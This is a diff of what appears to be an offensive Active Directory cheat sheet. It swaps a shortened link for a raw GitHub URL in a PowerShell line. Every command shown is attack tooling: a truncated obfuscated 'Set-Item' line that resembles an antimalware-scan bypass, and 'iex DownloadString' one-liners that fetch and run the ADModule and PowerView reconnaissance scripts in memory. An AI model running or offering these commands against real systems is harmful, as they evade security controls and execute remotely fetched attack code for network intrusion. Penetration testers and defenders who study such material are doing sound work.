@@ -24,7 +24,7 @@ sET-ItEM ( &apos;V&apos;+&apos;aR&apos; +  &apos;IA&apos; + &apos;blE:1q2&apos; 
 iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
 
 # PowerView Module
-iex (new-Object Net.WebClient).DownloadString('http://bit.ly/1pzQCnv');New-InMemoryModule
+iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1');New-InMemoryModule
 ```
 ## PRE-REQUISITE: AD Web Services on the DC
 
